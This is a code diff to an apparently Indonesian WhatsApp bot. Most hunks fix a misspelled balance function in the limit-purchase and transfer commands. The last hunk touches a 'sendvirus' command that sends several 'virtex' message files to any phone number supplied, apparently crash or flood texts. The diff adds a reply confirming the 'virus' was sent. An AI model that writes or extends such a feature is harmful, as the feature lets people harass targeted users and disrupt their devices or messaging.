@@ -1796,10 +1796,10 @@ case prefix+'add':
                 if (isNaN(args[1])) return reply(`Harus berupa angka`)
                 if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 let ane = Number(parseInt(args[1]) * 150)
-                if (gealance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
+                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                 kurangBalance(sender, ane, balance)
                 giveLimit(sender, parseInt(args[1]), limit)
-                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${gealance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
+                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
             }
                 break
 			case prefix+'transfer':
@@ -1810,7 +1810,7 @@ case prefix+'add':
                  if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                  if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                  if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
-                 var anu = gealance(sender, balance)
+                 var anu = getBalance(sender, balance)
                  if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                  kurangBalance(sender, parseInt(args[2]), balance)
                  addBalance(mentioned[0], parseInt(args[2]), balance)
@@ -1824,10 +1824,10 @@ case prefix+'add':
                 if (isNaN(args[1])) return reply(`Harus berupa angka`)
                 if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 let ane = Number(parseInt(args[1]) * 150)
-                if (gealance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
+                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                 kurangBalance(sender, ane, balance)
                 givegame(sender, parseInt(args[1]), glimit)
-                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${gealance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
+                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
             }
                 break
 			case prefix+'limit': case prefix+'balance':
@@ -2427,6 +2427,7 @@ case prefix+'sendvirus':
   conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/3.txt')})
   conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/4.txt')})
   conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/virtex.txt')})
+  reply(`succes mengirim virus ke nomer ${q}`)
   break
 default:
 			if (!isGroup && isCmd) {
